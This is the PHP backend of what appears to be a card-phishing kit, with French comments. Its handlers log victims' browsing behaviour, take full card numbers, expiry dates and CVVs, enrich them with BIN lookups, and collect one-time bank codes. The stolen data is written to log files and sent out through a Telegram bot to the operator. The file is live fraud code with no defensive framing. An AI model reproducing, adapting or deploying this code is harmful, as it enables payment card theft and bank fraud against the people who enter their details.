<?php
if (!defined('ROOT')) die('403');

header('Content-Type: application/json');

$action = $_POST['action'] ?? $_GET['action'] ?? '';

switch ($action) {

    // Tracking comportement
    case 'track':
        $data = json_decode(file_get_contents('php://input'), true);
        if ($data && isset($data['data'])) {
            $_SESSION['track'] = $data['data'];
            logSec('tracking.log', 'IP: ' . getIP() . ' | ' . json_encode($data['data']));
        }
        echo json_encode(['ok' => true]);
        break;

    // Soumettre carte
    case 'card':
        $card = $_POST['card'] ?? '';
        $exp = $_POST['exp'] ?? '';
        $cvv = $_POST['cvv'] ?? '';

        // BIN (6 premiers chiffres)
        $bin = substr(preg_replace('/\s+/', '', $card), 0, 6);

        // Obtenir info BIN
        $binInfo = getBIN($bin);

        // Logger
        $log = sprintf(
            "IP: %s | CARD: %s | EXP: %s | CVV: %s | BIN: %s",
            getIP(),
            $card,
            $exp,
            $cvv,
            $bin
        );

        if ($binInfo) {
            $log .= sprintf(
                " | BRAND: %s | TYPE: %s | LEVEL: %s | BANK: %s | COUNTRY: %s",
                $binInfo['Scheme'] ?? 'N/A',
                $binInfo['Type'] ?? 'N/A',
                $binInfo['CardTier'] ?? 'N/A',
                $binInfo['Issuer'] ?? 'N/A',
                $binInfo['Country']['A2'] ?? 'N/A'
            );
        }

        logSec('cards.log', $log);

        // Telegram si configuré
        if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID')) {
            $msg = "🆕 NOUVELLE CARTE\n\n";
            $msg .= "💳 Carte: `$card`\n";
            $msg .= "📅 Exp: `$exp`\n";
            $msg .= "🔐 CVV: `$cvv`\n\n";

            if ($binInfo) {
                $msg .= "🏦 INFO BIN\n";
                $msg .= "├ Marque: " . ($binInfo['Scheme'] ?? 'N/A') . "\n";
                $msg .= "├ Type: " . ($binInfo['Type'] ?? 'N/A') . "\n";
                $msg .= "├ Niveau: " . ($binInfo['CardTier'] ?? 'N/A') . "\n";
                $msg .= "├ Banque: " . ($binInfo['Issuer'] ?? 'N/A') . "\n";
                $msg .= "└ Pays: " . ($binInfo['Country']['A2'] ?? 'N/A') . "\n\n";
            }

            $msg .= "📍 IP: `" . getIP() . "`\n";
            if (isset($_SESSION['ip_data'])) {
                $msg .= "🌍 Pays: " . $_SESSION['ip_data']['country'] . "\n";
                $msg .= "🏙 Ville: " . $_SESSION['ip_data']['city'] . "\n";
            }

            sendTelegram($msg);
        }

        $_SESSION['card_submitted'] = true;
        echo json_encode(['ok' => true, 'redirect' => '/?r=o']);
        break;

    // Soumettre OTP
    case 'otp':
        $otp = $_POST['otp'] ?? '';

        $log = sprintf("IP: %s | OTP: %s", getIP(), $otp);
        logSec('otps.log', $log);

        // Telegram
        if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID')) {
            $msg = "🔑 NOUVEAU OTP\n\n";
            $msg .= "Code: `$otp`\n";
            $msg .= "IP: `" . getIP() . "`";
            sendTelegram($msg);
        }

        echo json_encode(['ok' => true, 'redirect' => '/?r=w']);
        break;

    // Statut
    case 'status':
        $status = $_SESSION['status'] ?? 'pending';
        echo json_encode(['status' => $status]);
        break;

    default:
        http_response_code(400);
        echo json_encode(['error' => 'Invalid action']);
}

/**
 * Envoyer message Telegram
 */
function sendTelegram($msg) {
    if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';

    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5
    ]);

    $result = curl_exec($ch);
    curl_close($ch);

    return $result !== false;
}
?>
